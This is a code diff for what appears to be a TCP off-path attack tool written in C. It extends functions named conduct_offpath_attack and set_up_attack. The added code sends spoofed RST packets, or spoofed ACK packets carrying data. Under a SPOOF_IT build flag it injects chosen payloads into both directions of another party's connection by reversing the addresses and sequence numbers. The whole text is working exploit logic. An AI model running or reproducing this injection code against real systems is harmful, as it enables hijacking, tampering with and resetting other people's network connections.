@@ -1611,11 +1611,17 @@ int conduct_offpath_attack(void)
 		return 0;
 	}
 
-	/* if we have both a seq and a client port, just send an RST */
+	/* if we have both a seq and a client port, just send a packet */
 	if (g_ctx.spoof.src.sin_port && g_ctx.spoof.seq) {
-		if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_RST, NULL, 0))
-			return 0;
-		return 1;
+		if (g_ctx.spoof.ack) {
+			if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_ACK, "z", 1))
+				return 0;
+		} else {
+			if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_RST, NULL, 0))
+				return 0;
+		}
+		/* exit the program here */
+		return 0;
 	}
 
 	gettimeofday(&attack_start, NULL);
@@ -1686,6 +1692,36 @@ int set_up_attack(void)
 	}
 	g_ctx.pch = pch;
 	g_ctx.ipoff = ipoff;
+
+#ifdef SPOOF_IT
+	/* if we have both a seq and a client port, just send a packet */
+	if (g_ctx.spoof.src.sin_port && g_ctx.spoof.seq) {
+		if (g_ctx.spoof.ack) {
+			if (g_ctx.inject_server) {
+				if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_ACK,
+							g_ctx.inject_server, g_ctx.inject_server_len))
+					return 0;
+			}
+			if (g_ctx.inject_client) {
+				conn_t reversed;
+
+				/* swap the src/dst and seq/ack to send to the client */
+				reversed.src = g_ctx.spoof.dst;
+				reversed.dst = g_ctx.spoof.src;
+				reversed.seq = g_ctx.spoof.ack;
+				reversed.ack = g_ctx.spoof.seq;
+				if (!tcp_send(g_ctx.pch, &reversed, TH_ACK,
+							g_ctx.inject_client, g_ctx.inject_client_len))
+					return 0;
+			}
+		} else {
+			if (!tcp_send(g_ctx.pch, &(g_ctx.spoof), TH_RST, NULL, 0))
+				return 0;
+		}
+		/* exit the program here */
+		return 0;
+	}
+#endif
 
 	/* set the local port */
 	pconn->src.sin_port = htons(lport);
